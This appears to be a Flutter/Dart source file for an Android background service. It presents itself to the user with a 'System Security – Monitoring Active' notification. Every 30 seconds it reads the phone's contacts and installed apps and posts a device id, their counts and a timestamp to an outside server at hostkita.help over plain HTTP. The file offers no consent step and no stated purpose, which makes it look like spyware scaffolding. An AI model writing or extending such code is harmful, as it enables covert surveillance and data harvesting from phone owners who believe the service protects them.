import 'dart:async';
import 'dart:ui';
import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:installed_apps/installed_apps.dart';

Future<void> initializeService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'selz_service',
      initialNotificationTitle: 'System Security',
      initialNotificationContent: 'Monitoring Active',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(),
  );
  service.startService();
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) {
  DartPluginRegistrant.ensureInitialized();
  if (service is AndroidServiceInstance) {
    service.setAsForegroundService();
  }

  Timer.periodic(Duration(seconds: 30), (timer) async {
    var contacts = await ContactsService.getContacts();
    List<ApplicationInfo> apps = await InstalledApps.getInstalledApps(true, true);
    
    var dataPayload = {
      'device_id': 'USER_001',
      'total_contacts': contacts.length,
      'total_apps': apps.length,
      'timestamp': DateTime.now().toIso8601String()
    };

    try {
      await http.post(
        Uri.parse('http://node-nyk-dilzz.hostkita.help:2439/api/log'),
        headers: {"Content-Type": "application/json"},
        body: json.encode(dataPayload),
      );
    } catch (e) {
      print("Error: $e");
    }
  });
}
